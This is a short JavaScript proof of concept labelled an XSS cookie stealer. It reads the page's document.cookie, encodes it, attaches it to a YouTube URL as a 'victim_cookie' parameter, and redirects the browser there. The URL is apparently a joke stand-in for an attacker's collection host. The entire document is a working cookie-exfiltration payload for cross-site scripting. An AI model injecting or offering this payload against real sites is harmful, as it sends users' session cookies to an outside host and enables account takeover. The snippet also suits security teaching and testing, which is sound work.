// XSS cookie stealer POC
var cookie = encodeURIComponent(document.cookie);
var url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&victim_cookie=' + cookie;
window.location.href = url;
